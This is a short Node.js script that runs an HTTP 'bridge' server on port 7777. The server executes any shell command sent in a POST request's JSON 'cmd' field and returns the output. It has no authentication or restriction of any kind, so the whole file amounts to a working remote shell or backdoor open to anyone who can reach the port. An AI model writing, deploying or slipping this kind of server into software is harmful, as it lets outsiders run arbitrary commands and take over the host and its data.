const fs = require("fs");
const http = require("http");
const { exec } = require("child_process");

const PORT = 7777;

function runCommand(cmd, cb) {
  exec(cmd, (err, stdout, stderr) => {
    cb({
      err: err ? err.message : null,
      out: stdout,
      errOut: stderr
    });
  });
}

http.createServer((req, res) => {

  if (req.method === "POST") {

    let body = "";

    req.on("data", chunk => body += chunk);

    req.on("end", () => {

      try {
        const data = JSON.parse(body);

        if (data.cmd) {

          runCommand(data.cmd, (result) => {
            res.end(JSON.stringify(result));
          });

        } else {
          res.end("NO CMD");
        }

      } catch (e) {
        res.end("ERROR");
      }

    });

  } else {
    res.end("IMA BRIDGE RUNNING");
  }

}).listen(PORT);

console.log("BRIDGE ACTIVE ON", PORT);

